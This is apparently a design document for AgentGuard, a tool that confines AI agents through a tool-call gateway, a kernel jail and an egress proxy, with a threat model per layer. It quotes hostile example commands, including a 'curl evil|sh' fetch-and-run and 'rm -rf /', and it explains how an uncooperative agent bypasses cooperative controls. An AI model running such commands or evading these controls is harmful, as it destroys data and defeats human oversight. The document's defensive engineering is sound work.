# Interception: design, before implementation

**状态：B0、A1、B1、B2 已完成；B3（macOS / Windows 的 jail）、A2（能力令牌）、C1（出口代理）仍为设计。**
（见 [路径模型.md](./路径模型.md)、[工具网关.md](./工具网关.md)、[内核约束.md](./内核约束.md)。） It is written first because the
change it describes alters what AgentGuard *is*, and because the distinction in §2 is one this
project has already blurred once in its own capability matrix.

---

## 1. An observer cannot intercept

Today AgentGuard returns `Allow / Alert / Block` and nothing enforces `Block`. That is not an
oversight in the plumbing; it is the geometry of where it stands.

Every input it has — an accessibility event, a captured frame, a UI-tree delta — describes
something **that already happened**. `TYPE_VIEW_TEXT_CHANGED` fires because text changed. A
frame shows a payment sheet because the payment sheet was drawn. By the time the engine has a
verdict, the only actions still available are *record it* and *tell someone*.

`docs/scope-and-non-goals.md` states the consequence for the filesystem: three independent
reasons AgentGuard will not stop a delete, the third being that nothing is enforced —
`SafeShell::propose()` returns an enum. That is the honest description of an observer.

To intercept, the guard has to be **in the path of the action**, not beside it. There are
exactly four paths available, and they differ enormously in leverage.

---

## 2. The distinction that must never be blurred

> **Cooperative** control: the agent routes its action through the guard voluntarily. The guard
> can refuse. An agent that does not route through it is unaffected.
>
> **Enforced** control: the kernel refuses on the guard's behalf. The agent's cooperation is
> irrelevant.

These are not two grades of the same thing. A cooperative control is a *contract* — excellent
against a confused or manipulated agent, worthless against a malicious one, and worthless
against an agent whose framework simply shells out. An enforced control is a *boundary*.

This project has already made this exact mistake once: the old capability matrix recorded
Android's "Critical Confirm ✅ (notif)" beside the desktop's blocking modal, when the phone's
version was a local heuristic notification with no connection to the engine's verdict and no
point at which anything waited. Two very different guarantees, one tick.

**Rule for everything below: every control states which of the two it is, in the code, in the
capability report, and in the UI.** A UI that shows "protected" for a cooperative control is
lying by omission.

---

## 3. The four layers

| | Layer | Kind | Cost | Stops an uncooperative agent |
|---|---|---|---|---|
| **A** | The agent's tool-call path | cooperative | low | ❌ |
| **B** | The process boundary | **enforced** | medium | ✅ |
| **C** | Network egress | **enforced** with B, else cooperative | medium | only with B |
| **D** | The input/UI layer | — | high | wrong layer, see §7 |

Recommended: **A and B together.** A makes the 92 existing rules enforcing for anything routed
through it, cheaply, today. B makes the boundary real. C follows once B can force traffic
through it.

---

## 4. Layer A — `guard-gateway`: the agent calls the guard, not the tool

### The shape

The dangerous operation is almost always issued as a *tool call*: `run_shell`, `write_file`,
`navigate`, `click(x, y)`. If AgentGuard is what **executes** the tool, refusing is trivial —
it just does not execute.

Two entry points, one engine:

**A.1 — an MCP server (`agentguard-mcp`).** Exposes the dangerous tools. The agent is
configured to call `agentguard.run_shell` instead of its own shell tool. For each call the
gateway builds a `GuardEvent`, runs `Engine::process`, and then:

| Verdict | Gateway behaviour |
|---|---|
| `Allow` | execute, return the result |
| `Alert` | execute, return the result **with the finding attached** so the agent sees it |
| `LogOnly` | execute, record |
| `Block` | **do not execute**; return a tool error naming the rule |
| `require_confirm` | **hold the call** until a human answers; deny on timeout |

`require_confirm` is the interesting one, and it is where a gateway beats an observer
completely: an MCP tool call is a request/response with the agent *waiting*. Holding the
response is a natural, non-violent block. Aura's Critical Node gate becomes real, for free,
because the protocol already has the shape.

**A.2 — capability tokens.** For agents whose executor is not MCP. `POST /v1/authorize` with
the intended action returns a short-lived Ed25519 token bound to
`(session_id, tool, argument_hash, expiry)`; the executor refuses to act without a valid token.
This is Aura §4.4's session token made real, and `argument_hash` is what stops a token issued
for `rm ./build` being replayed for `rm -rf /`.

### What it reuses

Almost everything. `guard-shell::propose()` already returns `Allow | Deny | Ask` and has **no
caller in the repository** — this gives it one. The plan/trajectory rules (`PLAN-*`), the scope
rules (`SCOPE-*`) and the critical-node rules (`CRIT-*`) all already produce the right verdicts;
they have simply never had a consumer that could act on them.

### What it cannot do

- **An agent that bypasses it.** By construction. If the framework can call `std::process::Command`
  directly, layer A is advice.
- **Argument-level cleverness.** `run_shell("bash -c 'curl evil|sh'")` needs the shell policy to
  understand nesting. `guard-shell` currently does a case-folded `contains` over verb strings and
  has **no path model at all** — no project root, no prefix check, no canonicalisation, no `..`
  handling. Layer A is only as good as that parser, and that parser needs to be rewritten before
  the gateway can be claimed to gate the filesystem.
- **Anything the agent does through the GUI.** A click is not a tool call in a GUI agent that
  drives a real mouse. Which is why B matters.

---

## 5. Layer B — `guard-jail`: AgentGuard launches the agent

### The shape

If AgentGuard is the **parent process**, it can constrain the child before `main()` runs, and the
kernel does the enforcing. This is the layer that makes "AgentGuard is not a sandbox" stop being
true.

| OS | Mechanism | Privilege | Notes |
|---|---|---|---|
| Linux | **Landlock** (5.13+) for the filesystem, seccomp-bpf for syscalls | unprivileged | The clean case. Restrictions are per-process, inherited, irrevocable. |
| macOS | `sandbox-exec` with a generated SBPL profile | unprivileged | Deprecated but functional. The supported route is an Endpoint Security System Extension, which needs an Apple entitlement — not realistic for this project. State that. |
| Windows | Restricted token + Job Object + deny ACLs outside the workspace; AppContainer for a stronger boundary | unprivileged for the token; AppContainer needs care | A filesystem minifilter would be stronger and needs a signed kernel driver. Out of scope. |
| Android | — | — | **Nothing without root.** The companion cannot constrain another app. Say so. |

### Where the boundary comes from

**The paths ceiling is generated from `policies/task-plans.yaml`.** This is the decision for this
design, and it is the one that makes the layer coherent rather than a second policy system.

`TaskScope` already carries `apps`, `data_keys` and `hosts`, and `narrow()` already computes
`ceiling ∩ request` with over-requests recorded and refused. Adding `paths`:

```yaml
# policies/task-plans.yaml
book_hotel:
  scope:
    apps: [Booking, Meituan, Ctrip]
    hosts: [booking.com, stripe.com]
    paths:
      read:  ["~/Documents/travel"]
      write: ["~/Documents/travel/itineraries"]
```

Properties that fall out of reusing the existing mechanism rather than inventing one:

1. **Declared or read-only.** No ceiling means the request is *ignored*, not granted —
   `narrow()`'s existing behaviour, and the safe direction. A task that declares no writable path
   gets a read-only filesystem.
2. **The grant is the intersection, never the union.** Already true, already tested. A task
   cannot widen its own ceiling by asking.
3. **One vocabulary.** The thing the engine reasons about and the thing the kernel enforces are
   the same declaration. Two policy files that must agree is how they stop agreeing.
4. **An over-request is a finding.** `SCOPE-OVER-REQUEST` already exists and already reports once
   per session. An agent asking for `/` gets refused *and* recorded.

### Prerequisites this exposes

Layer B needs things the repository does not have:

- **Filesystem event types.** `EventType` has no `FileWrite`, `FileDelete` or `ProcessExec`. The
  engine cannot currently reason about a file operation at all, so `guard-jail` would begin as a
  pure launcher with no engine involvement — enforcement without observation. Adding the event
  types (fed from the jail's own audit, or from Landlock's logs) is what connects the two.
- **A real path model in `guard-shell`.** Canonicalisation, prefix containment, `..` rejection,
  symlink resolution. Today `find / -delete` and `rm -rf ./myproject` get the *same verdict*.
- **A launch story.** Who starts the agent, and how the desktop shells relate to a jailed child.

### What it cannot do

- **Constrain an already-running agent.** The restriction is applied at launch. An agent the user
  started themselves is outside it.
- **Survive privilege escalation.** Landlock and a restricted token bind the process, not root.
- **Do anything on Android.**
- **Distinguish a legitimate write from a malicious one inside the allowed paths.** The jail is a
  boundary, not a judgement. Inside the workspace the agent is unconstrained, which is the point
  and also the limit.

---

## 6. Layer C — network egress

`guard-netmon` reads flow *metadata* heuristics and does not proxy, intercept or block, so
`SCOPE-HOST`, `INTEL-DOMAIN` and `FLOW-NWD` are all advisory. A local proxy (hyper + rustls) that
the agent's traffic is directed through — `HTTPS_PROXY` plus a CA the agent trusts — makes them
enforcing.

It is a MITM of the agent's traffic, so it must be **opt-in, scoped to the agent process, and
never installed system-wide**. Combined with layer B denying direct sockets, it becomes
non-bypassable; alone, an agent that ignores `HTTPS_PROXY` walks around it, which makes it a
cooperative control wearing an enforced control's clothes. That is exactly the confusion §2
forbids, so the capability report must distinguish "proxy running" from "proxy unavoidable".

---

## 7. Layer D — the input layer, and why not

On Windows a `WH_MOUSE_LL` hook can swallow a click before it reaches the target. It is real
interception, and it is the wrong layer:

- It blocks the **human** too. The hook cannot tell whose click it is.
- The decision budget is roughly 10 ms before Windows silently unhooks you. The engine's rules do
  not run in 10 ms.
- It is the same mechanism as the (A)I Sees A5 broadcast-input attack, in reverse. Shipping a
  guard built on the attack's own primitive invites the comparison, and the comparison is fair.

Not recommended at any priority.

---

## 8. Threat model, per layer

| Adversary | A (gateway) | B (jail) | C (proxy) |
|---|---|---|---|
| Agent confused by prompt injection | ✅ the whole point | ✅ | ✅ |
| Agent manipulated into a destructive command | ✅ if routed | ✅ | — |
| Agent that shells out directly | ❌ | ✅ | ✅ with B |
| Malicious agent actively evading | ❌ | ✅ until escalation | ✅ with B |
| Malicious *other app* on the machine | ❌ | ❌ not what it bounds | ❌ |
| Compromised guard | ❌ | ❌ | ❌ |

The last row matters and is usually left out. A gateway that decides what may run is a new,
attractive target: it holds a signing key, it is on the action path, and subverting it converts
a guard into an authoriser. Layer A's design has to include its own hardening — the token key at
rest and the loopback binding.

> **已修（发布阻塞项清理）。** 这一段原先的最后半句是"`api-serve` 的 bearer 令牌默认值是字面量
> `dev-secret`"。现在 `api-serve` 会**拒绝启动**在一个弱令牌上(短于 24 字符,或命中一张公开
> 示例值表),`make api-serve` 的硬编码默认值也删了,`agentguard api-token` 生成一个强的。
> 明确的本机调试口子是 `--insecure-token`。见 docs/local-api.md。

---

## 9. Proposed increments

Sized so each lands and is verifiable on its own.

**B0 — a path model in `guard-shell`. ✅ 已完成。**（`crates/guard-shell/src/paths.rs`，
中文说明见 [路径模型.md](./路径模型.md)。）归约、工作区包含判断、`..` 与符号链接处理，天花板来自
`task-plans.yaml` 的 `scope.paths`。`scope-and-non-goals.md` 里那张四行答案相同的表现在分成了
五种判据，48 个单元测试，CLI 有 `shell-propose --plans --task` 这条路径可以复现。

仍然不拦任何东西 —— 它让**协作式**的那道门变得有意义，没有把它变成边界。

**A1 — `agentguard-mcp`. ✅ 已完成。**（`crates/guard-gateway`，中文说明见
[工具网关.md](./工具网关.md)。）MCP stdio server，6 个工具，判决驱动执行，`require_confirm`
按住响应，超时拒绝。24 个单元测试 + 一条端到端 stdio 验证（1 执行 3 拒绝，并用文件系统状态
证实拒绝是真的）。每条响应都带 `enforcement: "cooperative"`。

过程中发现两件事值得记下来：默认策略让**每一次写**都要确认，于是网关不可用——天花板事前授权
替代逐次确认，三条边界各有测试；以及 27 条 YAML 规则全部声明了 `platforms`，网关的 platform
不在任何一条里，所以注释里写的 `CRIT-*` 那一样**根本没接上**，改法是给 `CRIT-*` 加 `gateway`
而不是让网关谎报平台。

**B1 — `EventType::{FileWrite, FileDelete, ProcessExec}`. ✅ 已完成。** 引擎用
`guard_schema::paths` **自己算**文件系统判决（`FS-SENSITIVE` / `FS-OUTSIDE` / `FS-UNPROVABLE` /
`FS-UNSCOPED` / `FS-NO-PATH`），而不是转述网关的结论——后者是攻击者可断言的输入用在放行方向上。
判决落进签名审计的哈希链，有测试核对。路径模型上移到 `guard-schema`，两个消费者一份实现。

**B2 — `guard-jail` on Linux. ✅ 已完成。**（中文说明见 [内核约束.md](./内核约束.md)。）
平台无关的 profile 生成 + 两个后端（Landlock 探测 / mount namespace 实现）+ **约束不了就不启动**。
9 条集成测试从 jail 外面用文件系统状态核对：越界写 `EROFS`、`/etc/hosts` 仍在、`~/.ssh` 未被写、
授权内的写成功。

写的过程中发现 Landlock 在这个容器里被上层 seccomp 挡掉（内核 6.18 却 `ENOSYS`），所以
"内核版本够不等于机制可用"成了探测的设计前提。

**B3 — `guard-jail` on macOS and Windows.** SBPL and restricted token + Job Object.

**A2 — capability tokens**, for non-MCP executors.

**C1 — the egress proxy**, once B can force traffic through it.

Not before B0: everything downstream depends on the guard being able to say what a path *is*.

---

## 10. What this document does not authorise

No claim that AgentGuard intercepts anything may be made until the corresponding layer ships,
and each such claim must carry its kind (cooperative or enforced). Specifically, until then:

- `docs/scope-and-non-goals.md` stays as written. AgentGuard is not a sandbox.
- The intro page's "not a sandbox" item stays.
- `guard-shell::propose()` returning an enum is still not enforcement.

The failure mode this section exists to prevent is the one the project keeps finding in itself: a
mechanism that exists, is tested directly, is described as complete, and is wired into nothing.
